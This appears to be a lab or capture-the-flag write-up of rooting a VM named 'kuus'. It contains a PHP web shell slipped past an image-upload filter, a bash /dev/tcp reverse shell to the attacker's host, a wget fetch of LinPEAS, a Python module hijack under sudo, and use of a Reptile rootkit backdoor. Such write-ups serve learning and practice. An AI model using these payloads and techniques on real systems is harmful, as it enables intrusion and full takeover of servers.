### **Initial Reconnaissance: Finding My Target**

My first step, as always, was to figure out what hosts were alive on the network. I used `netdiscover` to scan the `192.168.1.0/24` subnet. The output quickly showed me a few active devices, and `192.168.1.31` stood out as a potential target, identified by its MAC address vendor as "PCS Systemtechnik GmbH," which often indicates a virtual machine.

Once I had a target IP, I immediately launched a comprehensive `nmap` scan. I used `nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.31 -p-` to perform a SYN stealth scan, detect service versions, disable host discovery (since I already knew it was up), set a minimum packet rate for speed, and scan all 65535 TCP ports.

The `nmap` results were clear:

- **Port 22:** Open, running OpenSSH 7.9p1 Debian.
- **Port 80:** Open, running Apache httpd 2.4.38 ((Debian)).


This told me I had an SSH service and a web server to investigate.

### **Web Enumeration: Uncovering Hidden Paths**

With Port 80 open, my next move was to enumerate the web server for hidden directories and files. I started with `ffuf` and `gobuster`, using a common wordlist (`/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`) and looking for `.php` and `.txt` extensions.

`ffuf` quickly highlighted a few interesting paths:

- `/upload` (Status: 301 - Redirect)
- `/server-status` (Status: 403 - Forbidden)


`gobuster` confirmed `/upload` and also found `/index.php` and `/upload.php`.

I decided to investigate `index.php` first using `curl http://192.168.1.31/index.php`. This revealed a simple file upload form. The form's HTML indicated that it was designed to upload files to `upload.php` and explicitly stated: "Note: Only .jpg, .jpeg, .jpeg, .gif, .png formats are allowed up to a maximum size of 5 Mo."

I then checked `upload.php` directly with `curl http://192.168.1.31/upload.php`. It returned an empty response, which is typical for a backend processing script. Later, once I had a shell, I was able to `cat upload.php` and confirm its logic: it checks both the file extension (`pathinfo($filename, PATHINFO_EXTENSION)`) and the MIME type (`$_FILES["photo"]["type"]`) against a whitelist of image formats.

### **Gaining Initial Foothold: The Double Extension Trick**

Knowing the upload form's restrictions, I immediately thought of a common bypass for PHP file uploads: the double extension trick. Many web servers, especially Apache with certain configurations, will process a file like `shell.php.jpg` as a PHP file if the `.php` extension is recognized first, effectively ignoring the `.jpg` part.

I crafted a simple PHP reverse shell payload:

```php
<?php exec($_GET["cmd"]); ?>
```

I saved this payload to a file named `test.php.jpg` on my Kali machine.

Although the terminal output doesn't show the exact `POST` request for the upload, the subsequent `curl` command to `http://192.168.1.31/upload/test.php.jpg` (which returned a PHP warning about a blank command) confirmed that my file was successfully uploaded and was being interpreted as PHP!

With the file uploaded, I set up a Netcat listener on my Kali machine (`nc -lvnp 4444`). Then, I triggered the reverse shell by sending a `curl` request to my uploaded file, passing a bash reverse shell command through the `cmd` GET parameter:

```shellscript
curl 'http://192.168.1.31/upload/test.php.jpg?cmd=%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.5%2F4444%200%3E%261%22'
```

Boom! My Netcat listener caught the connection, and I had a shell as the `www-data` user.

### **User Privilege Escalation: From `www-data` to `tignasse`**

Now that I had a foothold, I started enumerating the system as `www-data`. My first instinct was to look for other users on the system. I navigated to `/home` and listed its contents: `mister_b` and `tignasse`.

I tried to `cd mister_b`, but permission was denied. However, `cd tignasse` worked! Inside `tignasse`'s home directory, a quick `ls -la` revealed a file named `.pass.txt`.

I tried `cat .pass.txt`, which initially showed "Try harder !". This seemed like a hint, but I suspected there might be hidden characters. I used `xxd .pass.txt` and `cat -A .pass.txt` to inspect the file more closely. This revealed `716n4553^MTry harder !$`. The `^M` (carriage return) indicated that `716n4553` was likely the actual password, with "Try harder !" being a misleading message on a new line.

I immediately tried to switch user to `tignasse` using `su tignasse` and the password `716n4553`. It worked! I confirmed my new user ID with `id`: `uid=1000(tignasse)`. To get a more stable and interactive shell, I spawned a PTY using Python: `python3 -c "import pty;pty.spawn('/bin/bash')"`.

### **User Privilege Escalation: From `tignasse` to `mister_b`**

As `tignasse`, my next step was to check for `sudo` privileges. I ran `sudo -l`, and the output was very interesting:

```plaintext
User tignasse may run the following commands on kuus:
    (mister_b) NOPASSWD: /usr/bin/python /opt/games/game.py
```

This meant I could execute `/usr/bin/python /opt/games/game.py` as the `mister_b` user without needing a password!

I inspected the `game.py` script located at `/opt/games/game.py`. It was a simple Python 2 "Rock, Paper, Scissors" game. Crucially, it imported `random` and `os`. I also checked the permissions of the `/opt/games` directory: `drwxrwx--- 2 mister_b tignasse`. This showed that the directory was group-writable by `tignasse`.

This was a classic Python library hijacking vulnerability. Since `/opt/games` was writable by me (`tignasse`), and `game.py` was executed from within that directory, Python's import mechanism would look for modules in the current directory first before checking system-wide paths. This meant I could create my own malicious `random.py` file in `/opt/games`, and `game.py` would import it instead of the legitimate `random` module.

I created a `random.py` file in `/opt/games` with the following content:

```python
import os
os.system('/bin/bash')
```

This simple script would execute a bash shell.

Then, I executed the `game.py` script as `mister_b` using my `sudo` privilege:

```shellscript
sudo -u mister_b /usr/bin/python /opt/games/game.py
```

Immediately, I got a new shell! I ran `id` to confirm, and indeed, I was now `uid=1001(mister_b)`.

Inside `mister_b`'s home directory, I found `user.txt`. I `cat`ed it and got the first flag: `Ciphura`.

### **Root Privilege Escalation: The Reptile Rootkit**

Now as `mister_b`, I needed to find a way to escalate to root. I started by transferring `linpeas.sh` to the target machine. On my Kali, I copied `linpeas.sh` to my current directory and started a Python HTTP server (`python3 -m http.server 80`). On the target, as `mister_b`, I used `wget http://192.168.1.5/linpeas.sh` to download it, then `chmod +x linpeas.sh` and `./linpeas.sh` to run it.

LinPEAS provided a wealth of information. Among the many findings, a few things stood out:

- **Kernel Version:** `Linux version 4.19.0-16-amd64`. LinPEAS suggested `CVE-2019-13272 (PTRACE_TRACEME)` as a highly probable exploit for this kernel version on Debian 10. I also saw `CVE-2021-3156 (sudo Baron Samedit)`.
- **`pkexec`:** The `PTRACE_TRACEME` exploit often targets `pkexec`. However, when I tried `which pkexec` and `find / -perm -4000` (to find SUID binaries), `pkexec` wasn't immediately found. The exploit itself also reported `[-] Could not find pkexec executable at /usr/bin/pkexec`. This suggested the `PTRACE_TRACEME` exploit might not work directly without `pkexec`.


However, something else caught my eye from my earlier `www-data` shell. I had noticed a directory `/reptile` and tried to execute `reptile_cmd` from there, which failed. While reviewing the provided terminal output, I saw a large block of text that looked like a Metasploit module description for `exploit/linux/local/reptile_rootkit_reptile_cmd_priv_esc`. This description explicitly stated:

> "This module uses Reptile rootkit's `reptile_cmd` backdoor executable to gain root privileges using the `root` command. The `reptile_cmd` utility, installed to `/reptile` by default, permits elevating privileges to root using the `root` argument."



This was the key! I had tried `./reptile_cmd shell` and `./reptile_cmd /bin/bash` earlier, but not `./reptile_cmd root`.

I switched back to my `www-data` shell (or re-established it if it had died). I navigated to `/reptile` and executed the command:

```shellscript
./reptile_cmd root
```

Immediately, my user ID changed! `id` showed `uid=0(root) gid=0(root) groups=0(root)`. I had successfully gained root privileges!

Finally, I navigated to the `/root` directory, listed its contents, and found `root.txt`. I `cat`ed it to get the final flag: `Warulli`.

This challenge was a great exercise in methodical enumeration, understanding common web vulnerabilities, and leveraging specific system misconfigurations and installed software for privilege escalation. The Python import hijacking and the obscure rootkit command were particularly satisfying finds!
